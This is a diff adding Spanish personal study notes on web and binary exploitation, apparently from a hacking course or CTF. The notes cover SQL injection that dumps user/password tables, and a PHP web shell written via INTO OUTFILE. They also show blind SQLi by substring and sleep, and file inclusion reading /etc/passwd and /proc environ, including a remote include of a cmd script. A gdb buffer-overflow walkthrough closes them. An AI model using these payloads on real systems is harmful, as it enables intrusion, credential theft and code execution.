@@ -1,0 +1,89 @@
+Union une selects con el mismo número de atributos (columnas)
+
+Si pones en el atributo del where un id que no existe, te saldrá solo tu select del union que te interesa
+
+El + y el %20 se codifica como un espacio cuando haces un curl por terminal
+
+No se puede poner un espacio para separar porque lo interpretaría lo siguiente al espacio como un protocolo
+
+Con curl -s sólo te sale el código html
+
+Luego concatenas con grep  para obtener el dato que te interese
+
+En mysql, information_schema es una tabla que guarda las bases de datos
+
+Table schema, table ñame, column name son atributos de information schema que te interesan
+
+Usar como último atributo de tu select del union
+
+Después accedes a la tabla user y password y listas las columnas
+
+Concat(user, '+', password)+from+users
+
+union+select+1,2,3,<?php system("ls");?>+into+outfile+'var/www/lalala.php' -> crear fichero en directorio web raiz con contenido de mi select -> ls y cat en /var/www para verlo
+localhost:puerto/lalala.php -> ver resultado de la ejecución del archivo php
+
+Los apaches se suelen poner siempre en las rutas estándares (var/www, ...)
+
+curl -s "http://ip/?id=1+and+1=1" -> esto significa que si muestra algo, significa que existe un id que es 1
+
+curl -s "http://ip/?id=1+and+(select+user+from+users+limit+1)='maxime'" | grep PALABRA	-> se puede poner un limit y un offset
+curl -s "http://ip/?id=1+and+(select+user+from+users+limit+0,1)='maxime'"  -> necesitas acertar la palabra entera
+
+Solución: curl -s "http://ip/?id=1+and+(select+substr(user, 1 ,1)+from+users+limit+0,1)='a'" | grep PALABRA  -> te devuelve si empieza por a creo
+
+En mysql se empieza a contar desde el 1
+
+Solución: AUX=´curl -s "http://ip/?id=1+and+(select+substr(user, 1 ,1)+from+users+limit+0,1)='a'" | grep PALABRA´ -> después hacer echo $AUX (puedes ademas meter mas condiciones de bash
+para mostrar el contenido de AUX solo en el caso que AUX no sea vacío, o que quieres mostrar solo una letra determinada del contenido, ...)
+
+curl -s "http://ip/?id=1+and+sleep(10)+or+1=0" > /dev/null -> como 1=0, siempre se va a verificar si id = 1 es True, y con el sleep lo podrás verificar -> puedes hacer consultas a la base de datos sin tener acceso
+Nota: Aprender conectores lógicos
+
+curl -s "http://ip/?page=/proc/1/cmdline" -> te devuelve la ruta de un sh (te devuelve la ruta del proceso base que nos permite ejecutar el contenedor docker)
+curl -s "http://ip/?page=/proc/1/environ" -> te devuelve las variables de entorno de un proceso en concreto (en este caso del proceso 1)
+curl -s "http://ip/?page=/etc/passwd"
+curl -s "http://ip/?page=/proc/net/ip"
+curl -s "http://ip/?page=/proc/net/arp" | strings -> nos permite ver el rango de red en el que está el ordenador (puedes ver si se ha comunicado con algún ordenador del área local viendo si salen las MACS de los equipos que se muestran)
+curl -s "http://ip/?page=/proc/net/tcp" -> 
+http://ip/page=https://bitbucket.org/.../cmd con algo de ls -al (tener cuidado con los includes que haces)
+
+data:///,lalalala -> la url son datos que meto en la ulr directamente -> http://ip/?page=data:///.lalalala
+
+Para los scanf con %s -> metes todos los caracteres que quieras, y luego añades en hexadecimal los caracteres que quieras
+
+gdb ./archivo_objeto -> debugueador de programas pasándole el binario
+
+disassemble main -> me desensambla el código de la función main
+
+guardar datos en la dirección de memoria en la que se están devolviendo los datos de la función que me interesa
+
+b *0x... poner un breakpoint justo al final donde se retorna la función
+r -> run
+c -> continue
+
+i f
+c
+01234567BBBB -> siendo B 0x42 en hexadecimal:
+01234567AAAABBBBCCCCDDDDEEEE -> te dice que la dirección de memoria no existe
+
+haciendo el i f tien es que ver el saved eip = "ALGO" para ver si la string que meto en el scanf es el mismo que ALGO
+
+el valor más significativo se pone el último, con lo cual tienes que ponerlo en el orden contrario
+
+disassemble itsmagic ->
+
+\x88 -> para meter en el printf numeros hexadecimales
+
+el objdump -d PROGRAMA_OBJETO | grep FUNCION -> es un programa que te da la dirección directamente
+
+
+
+
+
+
+
+
+
+
+
